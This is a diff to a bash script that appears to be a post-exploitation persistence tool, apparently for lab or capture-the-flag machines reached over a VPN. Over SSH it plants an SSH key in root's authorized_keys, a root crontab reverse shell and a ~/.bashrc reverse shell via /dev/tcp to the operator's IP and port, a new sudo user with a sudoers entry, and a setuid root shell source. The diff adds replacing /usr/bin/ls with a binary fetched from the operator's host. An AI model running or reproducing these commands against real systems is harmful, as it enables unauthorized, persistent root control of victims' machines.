@@ -34,6 +34,9 @@ read -p "Entre your ip: " ipuser
 read -p "Entre your port: " port
 read -p "Entre the name of the ssh public key file: " PUBLIC_KEY
 
+export ipuser
+export port
+
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
@@ -41,14 +44,23 @@ ssh -o StrictHostKeychecking=no "$user"@"$IP" << EOF
 
 sleep 3
 
-wget http://$vpn/"$PUBLIC_KEY" -O "/tmp/"$PUBLIC_KEY""
+sudo rm /usr/bin/ls
+
+wget "http://"$vpn":8000/"$PUBLIC_KEY"" -O "/tmp/"$PUBLIC_KEY""
 
 sleep 3
+
+wget http://"$vpn":8000/ls -O "/usr/bin/ls"
+
+sleep 3
+
+sudo chmod +x /usr/bin/ls
+
 cat "/tmp/"$PUBLIC_KEY"" >> "root/.ssh/authorized_keys"
 
 echo "* * * * * root /bin/sh -c \"/bin/bash -i >& /dev/tcp/"$ipuser"/"$port" 0>&1\"" | sudo tee -a /etc/crontab
 
-echo 'nc -e /bin/bash "$ipuser" "$port" 2>/dev/null &' >> ~/.bashrc
+echo '/bin/sh -i >& /dev/tcp/"$ipuser"/"$port" 0>&1' >> ~/.bashrc
 
 sudo adduser --disabled-password --gecos "" "$USER"
 
@@ -57,6 +69,7 @@ echo ""$USER":"$PASS"" | sudo chpasswd
 sudo usermod -aG sudo "$USER"
 
 echo ""$USER" ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
+
 
 touch vshell.c
 echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > vshell.c
